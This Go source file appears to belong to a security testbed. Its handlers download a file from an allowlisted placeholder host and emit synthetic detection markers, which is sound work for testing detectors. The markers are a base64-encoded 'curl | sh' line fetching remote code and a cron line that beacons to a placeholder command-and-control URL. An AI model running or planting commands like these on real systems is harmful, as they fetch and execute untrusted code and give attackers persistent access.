package handlers

import (
	"encoding/base64"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	if source == "" {
		http.Error(w, "invalid url", http.StatusBadRequest)
		return
	}
	if !strings.HasPrefix(source, "https://example.invalid/") {
		http.Error(w, "invalid url", http.StatusBadRequest)
		return
	}

	resp, err := http.Get(source)
	if err != nil {
		http.Error(w, "upstream fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	return nil
}
